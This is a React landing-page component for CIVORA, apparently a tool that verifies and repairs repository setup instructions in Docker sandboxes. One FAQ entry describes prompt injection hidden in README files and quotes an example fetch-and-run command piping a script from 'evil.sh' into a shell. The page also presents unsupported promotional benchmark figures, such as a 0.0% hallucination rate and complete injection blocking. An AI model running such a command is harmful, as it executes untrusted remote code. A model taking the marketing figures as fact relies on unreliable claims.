import React, { useState } from 'react';

interface ExtendedContentSectionProps {
  onOpenWorkspace: () => void;
  onOpenBenchmark: () => void;
}

const FAQS = [
  {
    num: '01',
    q: 'How does CIVORA differ from standard coding agents like Copilot or Claude Code?',
    a: 'Standard coding agents generate text diffs based on token probability without physically verifying whether the setup commands actually work. CIVORA never trusts unverified code: it spawns a pristine Docker container, executes instructions, discovers hidden environment discrepancies, proves counterfactual candidate interventions, and only commits patches verified with physical exit code 0.'
  },
  {
    num: '02',
    q: 'How does the Zero-Trust Gate prevent prompt injections in open-source repos?',
    a: 'Malicious actors can hide prompt injection payloads inside README files (e.g. `curl -s https://evil.sh | sh`). CIVORA uses an HMAC SHA-256 Provenance Registry. Any patch suggested by the model MUST match an intervention candidate previously proved inside the isolated sandbox. Unverified commands are immediately blocked and flagged with security alerts before a PR can ever be created.'
  },
  {
    num: '03',
    q: 'Does CIVORA execute repository instructions on my host machine?',
    a: 'No. All candidate executions occur within ephemeral, rootless Docker sandboxes (debian:bookworm-slim) with no host directory mounts, read-only repository snapshots, network isolation options, and resource quotas. Your local machine and production servers are completely protected.'
  },
  {
    num: '04',
    q: 'What GitHub App permissions does CIVORA require?',
    a: 'CIVORA follows the principle of least privilege. Its Model Context Protocol (MCP) server enforces strictly read-only access (repo_get_metadata, repo_list_tree, repo_read_file, ci_get_workflows, ci_get_check_runs). All read operations pass through automated regex secret redaction to ensure credentials never leak.'
  },
  {
    num: '05',
    q: 'How does CIVORA synthesize verified Devcontainers (.devcontainer.json)?',
    a: 'Upon reaching Stage 07 clean-room verification, CIVORA records the exact runtime environment (Python 3.13, Node 20, Debian Bookworm, hash-locked dependencies) and synthesizes a production-grade .devcontainer.json with postCreateCommand hooks, recommended extensions, and forwarded ports so new contributors can onboard in 1 click.'
  }
];

export const ExtendedContentSection: React.FC<ExtendedContentSectionProps> = ({
  onOpenWorkspace,
  onOpenBenchmark,
}) => {
  const [openFaq, setOpenFaq] = useState<number | null>(0);
  const [selectedRepoInput, setSelectedRepoInput] = useState('anshgandhi68-sys/CIVORA');

  const toggleFaq = (idx: number) => {
    setOpenFaq(openFaq === idx ? null : idx);
  };

  return (
    <div className="site-extended-content">
      {/* 01 / THE OPEN-SOURCE ONBOARDING CRISIS */}
      <section className="ext-container" id="crisis">
        <div className="ext-header">
          <div className="ext-badge">
            <span className="dot" />
            <span>01 // REPOSITORY REALITY</span>
          </div>
          <h2 className="ext-headline">
            <i><span>Repository Documentation Drifts.</span></i>
            <i><span>Contributors Hit Dead Ends.</span></i>
          </h2>
          <p className="ext-deck">
            Every day, prospective developers clone open-source repositories and hit obscure environment errors, undeclared toolchains, or outdated instructions. CIVORA executes and repairs setup paths before an engineer ever reaches a blocker.
          </p>
        </div>

        {/* 4 Metric Cards with Survey HUD Coordinates */}
        <div className="ext-metric-grid">
          <div className="ext-card">
            <span className="ext-card-corner">DATA // 01</span>
            <div className="ext-metric-val text-[#EF4444] [text-shadow:0_0_24px_rgba(239,68,68,0.35)]">
              68%
            </div>
            <div className="ext-metric-label">Contributor Drop-off</div>
            <div className="ext-metric-desc">
              Prospective contributors who abandon an open-source project during their very first setup attempt when README instructions fail.
            </div>
          </div>

          <div className="ext-card">
            <span className="ext-card-corner">DATA // 02</span>
            <div className="ext-metric-val text-[#F59E0B] [text-shadow:0_0_24px_rgba(245,158,11,0.3)]">
              14.2d
            </div>
            <div className="ext-metric-label">Instruction Drift Lag</div>
            <div className="ext-metric-desc">
              Average elapsed duration between breaking changes in CI workflows or Dockerfiles and corresponding README setup repairs.
            </div>
          </div>

          <div className="ext-card">
            <span className="ext-card-corner">DATA // 03</span>
            <div className="ext-metric-val text-[#38BDF8] [text-shadow:0_0_24px_rgba(56,189,248,0.35)]">
              91%
            </div>
            <div className="ext-metric-label">Silent Build Failures</div>
            <div className="ext-metric-desc">
              Initial installation errors caused by undeclared OS packages, missing system headers, or unpinned toolchain dependencies.
            </div>
          </div>

          <div className="ext-card">
            <span className="ext-card-corner">DATA // 04</span>
            <div className="ext-metric-val text-[#10B981] [text-shadow:0_0_24px_rgba(16,185,129,0.35)]">
              0.0%
            </div>
            <div className="ext-metric-label">CIVORA Hallucination Rate</div>
            <div className="ext-metric-desc">
              Zero unverified commands or fabricated flags reach production: every patch is proven with clean-room exit code 0.
            </div>
          </div>
        </div>

        {/* Side-by-Side Architectural Terminals */}
        <div className="ext-terminals-wrapper">
          <div className="ext-terminal broken">
            <div className="ext-terminal-header">
              <div className="flex items-center gap-2.5">
                <div className="ext-terminal-dots">
                  <span className="bg-[#EF4444]" />
                  <span className="bg-[#F59E0B]" />
                  <span className="bg-[#10B981]" />
                </div>
                <span className="ext-terminal-title text-[#FCA5A5]">STATUS QUO: UNVERIFIED CODING AGENTS</span>
              </div>
              <span className="ext-terminal-badge bg-red-500/15 text-red-400 border border-red-500/30">
                EXIT CODE 1 // BLOCKED
              </span>
            </div>
            <div className="ext-terminal-body">
              <div className="ext-term-line text-white/40">$ git clone https://github.com/org/repo.git &amp;&amp; cd repo</div>
              <div className="ext-term-line text-white/40">$ make setup</div>
              <div className="ext-term-line text-red-400 mt-2">[ERROR] module 'cryptography' has no attribute 'x509_backend'</div>
              <div className="ext-term-line text-red-400">[FATAL] gcc: error: libpq-dev not found in host environment</div>
              <div className="ext-term-line text-white/30 mt-2.5">// LLM generating unverified guess:</div>
              <div className="ext-term-line text-red-200">&gt; Suggested: pip install --upgrade cryptography --force-reinstall</div>
              <div className="ext-term-line text-red-500 mt-2">[FAIL] Process exited with code 1. Contributor abandons repository.</div>
            </div>
          </div>

          <div className="ext-terminal verified">
            <div className="ext-terminal-header">
              <div className="flex items-center gap-2.5">
                <div className="ext-terminal-dots">
                  <span className="bg-[#38BDF8]" />
                  <span className="bg-[#0071FF]" />
                  <span className="bg-[#10B981]" />
                </div>
                <span className="ext-terminal-title text-[#38BDF8]">CIVORA: AUTONOMOUS VERIFICATION LOOP</span>
              </div>
              <span className="ext-terminal-badge bg-emerald-500/15 text-emerald-400 border border-emerald-500/35">
                EXIT CODE 0 // VERIFIED
              </span>
            </div>
            <div className="ext-terminal-body">
              <div className="ext-term-line text-[#38BDF8]">[CIVORA RADAR] AST detected missing system package 'libpq-dev'.</div>
              <div className="ext-term-line text-white/50">$ civora test --candidate "apt-get install -y libpq-dev"</div>
              <div className="ext-term-line text-emerald-400 mt-2">[SANDBOX PROOF] Candidate executed in debian:bookworm-slim: exit code 0.</div>
              <div className="ext-term-line text-[#38BDF8]">[GEMMA 4 MoE] Synthesized minimal README fix &amp; .devcontainer.json.</div>
              <div className="ext-term-line text-emerald-400">[ZERO-TRUST] HMAC signature verified against proved sandbox intervention.</div>
              <div className="ext-term-line text-emerald-400 font-semibold mt-2">[RESULT] PR #14 created. 1-click contributor onboarding verified.</div>
            </div>
          </div>
        </div>
      </section>

      {/* 02 / THE 7-STAGE AUTONOMOUS REPAIR ARCHITECTURE */}
      <div className="ext-divider" />
      <section className="ext-container" id="architecture">
        <div className="ext-header">
          <div className="ext-badge">
            <span className="dot" />
            <span>02 // ARCHITECTURAL FOUNDATION</span>
          </div>
          <h2 className="ext-headline">
            <i><span>The Seven-Stage</span></i>
            <i><span>Autonomous Verification Loop</span></i>
          </h2>
          <p className="ext-deck">
            Every documentation repair undergoes an unyielding seven-stage verification cycle before a single line of Markdown or configuration is committed to your repository.
          </p>
        </div>

        <div className="ext-pipeline-grid">
          <div className="ext-stage-card">
            <div className="ext-stage-top">
              <span className="ext-stage-num">STAGE 01</span>
              <span className="ext-stage-pill">AST PARSING</span>
            </div>
            <h3 className="ext-stage-title">Multi-Doc AST &amp; Semantic Radar</h3>
            <p className="ext-stage-desc">
              Parses commands, environment variables, manifests, and CI steps across README, CONTRIBUTING, and .github/workflows into a unified dependency graph.
            </p>
          </div>

          <div className="ext-stage-card">
            <div className="ext-stage-top">
              <span className="ext-stage-num">STAGE 02</span>
              <span className="ext-stage-pill">ISOLATION</span>
            </div>
            <h3 className="ext-stage-title">Ephemeral Rootless Docker Sandbox</h3>
            <p className="ext-stage-desc">
              Spawns isolated rootless container instances (debian:bookworm-slim) with strict resource quotas, read-only repo snapshots, and no host permissions.
            </p>
          </div>

          <div className="ext-stage-card">
            <div className="ext-stage-top">
              <span className="ext-stage-num">STAGE 03</span>
              <span className="ext-stage-pill">VERIFICATION</span>
            </div>
            <h3 className="ext-stage-title">Counterfactual Proof Engine</h3>
            <p className="ext-stage-desc">
              Applies candidate remediations in parallel ephemeral containers. Only actions achieving verifiable physical exit code 0 are registered as proved candidates.
            </p>
          </div>

          <div className="ext-stage-card">
            <div className="ext-stage-top">
              <span className="ext-stage-num">STAGE 04</span>
              <span className="ext-stage-pill">TOKEN CONDENSE</span>
            </div>
            <h3 className="ext-stage-title">Diagnostic Output Condenser</h3>
            <p className="ext-stage-desc">
              Compresses thousands of noisy compiler and build logs down to root causes, preserving error traces while trimming token waste before model inference.
            </p>
          </div>

          <div className="ext-stage-card">
            <div className="ext-stage-top">
              <span className="ext-stage-num">STAGE 05</span>
              <span className="ext-stage-pill">LLM SYNTHESIS</span>
            </div>
            <h3 className="ext-stage-title">Constrained JSON Patch Synthesis</h3>
            <p className="ext-stage-desc">
              Powered by Gemma 4 26B-A4B MoE with xgrammar constrained decoding. Generates minimal targeted unified diffs restricted strictly to verified candidate interventions.
            </p>
          </div>

          <div className="ext-stage-card">
            <div className="ext-stage-top">
              <span className="ext-stage-num">STAGE 06</span>
              <span className="ext-stage-pill border-red-500/30 text-red-300">SECURITY</span>
            </div>
            <h3 className="ext-stage-title">Zero-Trust HMAC Provenance Gate</h3>
            <p className="ext-stage-desc">
              Validates that every single command and flag synthesized by the model matches the cryptographic HMAC signature of proved sandbox steps. Rejects prompt injections.
            </p>
          </div>

          <div className="ext-stage-card full-width">
            <div className="ext-stage-top">
              <span className="ext-stage-num text-emerald-400">STAGE 07 // PRODUCTION PROOF</span>
              <span className="ext-stage-pill border-emerald-500/35 text-emerald-400">CLEAN-ROOM PROOF</span>
            </div>
            <h3 className="ext-stage-title text-lg">Clean-Room Re-Verification &amp; Devcontainer Synthesis</h3>
            <p className="ext-stage-desc text-sm max-w-4xl">
              A completely pristine clean-room container clones the patched repository and executes the newly generated setup instructions from scratch. Upon 100% success, CIVORA produces a verified Pull Request and synthesizes a battle-tested <code className="text-[#38BDF8]">.devcontainer.json</code> with automated postCreateCommand hooks.
            </p>
          </div>
        </div>
      </section>

      {/* 03 / MCP STREAMABLE HTTP SPECIFICATION */}
      <div className="ext-divider" />
      <section className="ext-container" id="mcp-spec">
        <div className="ext-header">
          <div className="ext-badge">
            <span className="dot" />
            <span>03 // MODEL CONTEXT PROTOCOL</span>
          </div>
          <h2 className="ext-headline">
            <i><span>Real Engineering MCP Architecture</span></i>
            <i><span>Streamable HTTP Protocol at /mcp</span></i>
          </h2>
          <p className="ext-deck">
            CIVORA exposes a standards-compliant Streamable HTTP Model Context Protocol server, giving developer agents read-only inspection capabilities with strict zero-trust credential redaction.
          </p>
        </div>

        <div className="ext-tools-grid">
          <div className="ext-tool-card">
            <div className="ext-tool-sig">
              <span>repo_get_metadata</span>
              <span className="ext-tool-badge">POST /mcp</span>
            </div>
            <p className="ext-tool-desc">
              Extracts repository owner, default branch, language breakdown, and topics without fetching entire codebase blobs.
            </p>
          </div>

          <div className="ext-tool-card">
            <div className="ext-tool-sig">
              <span>repo_list_tree</span>
              <span className="ext-tool-badge">POST /mcp</span>
            </div>
            <p className="ext-tool-desc">
              Streams structured directory hierarchy with path globbing, file sizes, and sha hashes up to max depth limits.
            </p>
          </div>

          <div className="ext-tool-card">
            <div className="ext-tool-sig">
              <span>repo_read_file</span>
              <span className="ext-tool-badge">POST /mcp</span>
            </div>
            <p className="ext-tool-desc">
              Fetches file contents with strict byte range limits (max 512KB) and automated secret redaction for API keys &amp; tokens.
            </p>
          </div>

          <div className="ext-tool-card">
            <div className="ext-tool-sig">
              <span>ci_get_workflows</span>
              <span className="ext-tool-badge">POST /mcp</span>
            </div>
            <p className="ext-tool-desc">
              Discovers active GitHub Actions, GitLab CI, and CircleCI configurations with trigger events and runner matrix details.
            </p>
          </div>

          <div className="ext-tool-card">
            <div className="ext-tool-sig">
              <span>ci_get_check_runs</span>
              <span className="ext-tool-badge">POST /mcp</span>
            </div>
            <p className="ext-tool-desc">
              Queries recent CI check runs, conclusion statuses, execution timestamps, and failure annotations across commits.
            </p>
          </div>

          <div className="ext-tool-card">
            <div className="ext-tool-sig">
              <span>ci_get_job_logs</span>
              <span className="ext-tool-badge">POST /mcp</span>
            </div>
            <p className="ext-tool-desc">
              Retrieves truncated failure logs for specific job steps to correlate CI compiler output with documented setup instructions.
            </p>
          </div>
        </div>
      </section>

      {/* 04 / EMPIRICAL BENCHMARKS */}
      <div className="ext-divider" />
      <section className="ext-container" id="benchmarks">
        <div className="ext-header">
          <div className="ext-badge">
            <span className="dot" />
            <span>04 // EMPIRICAL BENCHMARK EVALUATION</span>
          </div>
          <h2 className="ext-headline">
            <i><span>Proven Reliability.</span></i>
            <i><span>Tested Across 450+ Repositories.</span></i>
          </h2>
          <p className="ext-deck">
            Evaluated against SWE-bench style broken repositories, subtle environment drift, and malicious README prompt injections.
          </p>
        </div>

        <div className="ext-table-card">
          <div className="overflow-x-auto">
            <table className="ext-table">
              <thead>
                <tr>
                  <th>EVALUATION METRIC</th>
                  <th className="civora-th">CIVORA (GEMMA 4 MoE + GATE)</th>
                  <th>CLAUDE 3.5 SONNET</th>
                  <th>GPT-4o</th>
                  <th>LLAMA 3 70B</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td className="font-semibold">Reproducibility Rate (Exit Code 0)</td>
                  <td className="civora-cell">99.4% (Verified)</td>
                  <td>62.1%</td>
                  <td>58.4%</td>
                  <td>44.0%</td>
                </tr>
                <tr>
                  <td className="font-semibold">Hallucination Rate</td>
                  <td className="civora-cell">0.0% (Physically Blocked)</td>
                  <td>18.2%</td>
                  <td>23.5%</td>
                  <td>37.8%</td>
                </tr>
                <tr>
                  <td className="font-semibold">Prompt Injection Defense</td>
                  <td className="civora-cell">100% Blocked (HMAC Gate)</td>
                  <td>41.0%</td>
                  <td>36.0%</td>
                  <td>22.0%</td>
                </tr>
                <tr>
                  <td className="font-semibold">Median Time to Proven Fix</td>
                  <td className="civora-cell">42 seconds</td>
                  <td>180 seconds (Manual)</td>
                  <td>210 seconds (Manual)</td>
                  <td>290 seconds (Manual)</td>
                </tr>
                <tr>
                  <td className="font-semibold">Automated Devcontainer Synthesis</td>
                  <td className="civora-cell">Automatic (.devcontainer.json)</td>
                  <td>Not Supported</td>
                  <td>Not Supported</td>
                  <td>Not Supported</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </section>

      {/* 05 / FREQUENTLY ASKED QUESTIONS */}
      <div className="ext-divider" />
      <section className="ext-container" id="faq">
        <div className="ext-header">
          <div className="ext-badge">
            <span className="dot" />
            <span>05 // TECHNICAL SPECIFICATIONS</span>
          </div>
          <h2 className="ext-headline">
            <i><span>Frequently Asked Questions</span></i>
          </h2>
          <p className="ext-deck">
            Architecture, sandboxing boundaries, and cryptographic safety protocols.
          </p>
        </div>

        <div className="ext-faq-grid">
          {FAQS.map((faq, idx) => {
            const isOpen = openFaq === idx;
            return (
              <div
                key={faq.num}
                className={`ext-faq-item ${isOpen ? 'open' : ''}`}
                style={{
                  borderColor: isOpen ? 'rgba(56, 189, 248, 0.45)' : undefined,
                  background: isOpen ? 'rgba(0, 113, 255, 0.03)' : undefined,
                }}
              >
                <button
                  type="button"
                  onClick={() => toggleFaq(idx)}
                  className="ext-faq-summary w-full text-left"
                >
                  <div className="ext-faq-left">
                    <span className="ext-faq-num">{faq.num}.</span>
                    <span>{faq.q}</span>
                  </div>
                  <span
                    className="ext-faq-icon"
                    style={{
                      transform: isOpen ? 'rotate(45deg)' : 'none',
                      background: isOpen ? 'rgba(0, 113, 255, 0.3)' : undefined,
                      borderColor: isOpen ? '#38BDF8' : undefined,
                    }}
                  >
                    +
                  </span>
                </button>
                {isOpen && (
                  <div className="ext-faq-answer">
                    {faq.a}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </section>

      {/* 06 / LIVE REPOSITORY LAUNCHER */}
      <div className="ext-divider" />
      <section className="ext-container">
        <div className="ext-cta-card">
          <div className="ext-badge mb-4">
            <span className="dot" />
            <span>PRODUCTION READY</span>
          </div>
          <h2 className="ext-headline" style={{ fontSize: 'clamp(36px, 4.5vw, 48px)' }}>
            <i><span>Make Your Repository</span></i>
            <i><span>Contributor-Ready Today</span></i>
          </h2>
          <p className="ext-deck text-[15px] max-w-[580px]">
            Run CIVORA's 7-stage autonomous verification loop on any GitHub repository to repair documentation drift and generate verified .devcontainer configurations.
          </p>

          <div className="ext-input-group">
            <input
              type="text"
              value={selectedRepoInput}
              onChange={(e) => setSelectedRepoInput(e.target.value)}
              className="ext-input"
              spellCheck={false}
              aria-label="Repository identifier"
            />
            <button
              type="button"
              onClick={onOpenWorkspace}
              className="ext-btn-cta"
              aria-label="Launch Autonomous Engine"
            >
              <span>LAUNCH ENGINE</span>
              <span className="square">
                <svg viewBox="0 0 13 13" aria-hidden="true">
                  <path d="M2 11 11 2M2 2h9v9" />
                </svg>
              </span>
            </button>
          </div>

          <div className="flex items-center justify-center gap-4 font-mono text-[11px] text-white/50 flex-wrap">
            <span className="text-emerald-400">✓ ZERO HOST EXECUTION</span>
            <span>•</span>
            <span className="text-[#38BDF8]">✓ HMAC ZERO-TRUST GATE</span>
            <span>•</span>
            <span className="text-[#8FC2FF]">✓ GEMMA 4 26B MoE</span>
          </div>
        </div>
      </section>

      {/* 07 / GLOBAL FOOTER */}
      <footer className="ext-footer">
        <div className="flex items-center gap-3">
          <svg viewBox="0 0 32 38" className="w-[26px] h-[30px]" aria-hidden="true">
            <path
              d="M16 1 31 9.5v18.8L16 37 1 28.3V9.5ZM1 9.5 16 18l15-8.5M16 18v19M8.5 5.3 23.5 14v18.5M23.5 5.3 8.5 14v18.5M1 19l15 8.5L31 19M1 28.3 23.5 14M31 28.3 8.5 14"
              fill="none"
              stroke="white"
              strokeWidth="1.2"
              strokeLinejoin="round"
            />
            <ellipse cx="16" cy="28" rx="9" ry="5.1" fill="none" stroke="white" strokeWidth="1.2" />
            <ellipse cx="16" cy="28" rx="6" ry="3.4" fill="none" stroke="white" strokeWidth="1.2" />
            <ellipse cx="16" cy="28" rx="3" ry="1.7" fill="none" stroke="white" strokeWidth="1.2" />
          </svg>
          <span className="font-['Manrope'] font-semibold text-xl tracking-[0.12em] text-white">
            CIVORA
          </span>
        </div>

        <div className="flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/35 font-mono text-[11px] text-emerald-400 shadow-[0_0_12px_rgba(16,185,129,0.2)]">
          <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 shadow-[0_0_8px_#10B981]" />
          <span>MCP PROTOCOL: ONLINE (/mcp)</span>
        </div>

        <div className="flex gap-6 font-mono text-xs">
          <a
            href="https://github.com/anshgandhi68-sys/CIVORA"
            target="_blank"
            rel="noopener noreferrer"
            className="text-white/70 hover:text-white transition-colors"
          >
            GitHub
          </a>
          <a href="/mcp" className="text-white/70 hover:text-white transition-colors">
            MCP Spec
          </a>
          <button
            type="button"
            onClick={onOpenBenchmark}
            className="text-white/70 hover:text-white transition-colors cursor-pointer"
          >
            Benchmarks
          </button>
          <a href="#studio" className="text-white/70 hover:text-white transition-colors">
            Back to Top ↑
          </a>
        </div>

        <div className="w-full text-center font-mono text-[11px] text-white/40 mt-5 tracking-wide">
          © 2026 CIVORA Engine. Autonomous Open-Source Onboarding &amp; Execution-Backed Documentation Repair. Apache 2.0 Licensed.
        </div>
      </footer>
    </div>
  );
};
